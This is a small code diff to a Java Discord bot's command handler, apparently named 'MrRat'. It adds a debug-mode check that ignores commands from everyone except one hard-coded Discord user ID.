@@ -30,6 +30,12 @@ public class CommandManager extends ListenerAdapter {
         String message = e.getMessage().getContentRaw();
         event = e;
 
+        if(MrRat.debug) {
+            if(!event.getAuthor().toString().equalsIgnoreCase("U:Keviniest(682501040561848335)")) {
+                return;
+            }
+        }
+
         if(!message.startsWith(String.valueOf(MrRat.prefix))) {
             return;
         }
